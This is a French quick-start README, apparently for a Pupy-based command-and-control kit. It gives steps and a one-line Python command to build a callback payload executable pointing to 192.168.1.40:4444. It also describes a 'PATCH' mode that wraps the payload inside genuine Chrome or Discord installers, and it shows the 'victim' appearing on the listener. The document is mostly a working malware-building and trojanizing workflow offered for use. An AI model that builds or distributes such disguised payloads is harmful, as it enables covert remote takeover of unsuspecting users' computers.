# 🚀 Quick Start - VM Windows

## Setup Rapide (10 minutes)

### 1. Installe Python
```
https://www.python.org/downloads/
✅ Coche "Add Python to PATH"
```

### 2. Installe PyInstaller
```powershell
pip install pyinstaller
```

### 3. Clone le Repo
```powershell
cd Desktop
git clone https://github.com/kalilBelgoumri/pupy-c2-manager-macos.git
cd pupy-c2-manager-macos
```

---

## 🔨 Build Standalone

Double-clique sur : `build_windows_local.bat`

Ou en ligne de commande :
```powershell
python -c "from src.c2_bundler_simple import create_bundled_payload; create_bundled_payload('192.168.1.40', 4444, 2, 'windows')"
```

**Résultat** : `dist\c2_payload.exe`

---

## 🎭 Build avec PATCH (Chrome, Discord, etc.)

1. Télécharge un vrai installateur :
   - Chrome : https://www.google.com/chrome/
   - Discord : https://discord.com/download

2. Double-clique sur : `build_patch_windows.bat`

3. Entre le chemin : `C:\Users\TON_USER\Desktop\ChromeSetup.exe`

**Résultat** : `dist\ChromeSetup.exe` (patché)

---

## 🧪 Test

### Sur Mac (Listener)
```bash
python3 src/main.py
# → Clients → Start Listener
```

### Dans la VM (Payload)
```powershell
cd pupy-c2-manager-macos\dist
.\c2_payload.exe
```

**Attends 5-10 secondes** → Victime apparaît sur le Mac ! ✅

---

## 📁 Fichiers Importants

| Fichier | Description |
|---------|-------------|
| `build_windows_local.bat` | Build payload standalone |
| `build_patch_windows.bat` | Build avec mode PATCH |
| `WINDOWS_VM_SETUP.md` | Guide complet détaillé |

---

## ⚠️ Configuration Réseau

La VM doit pouvoir communiquer avec ton Mac :

**VirtualBox/VMware** : Settings → Network → **Bridged Adapter**

Test :
```powershell
ping 192.168.1.40
Test-NetConnection -ComputerName 192.168.1.40 -Port 4444
```

---

## 🎯 C'est Tout !

Plus besoin de GitHub Actions, tu compiles directement dans ta VM ! 💪
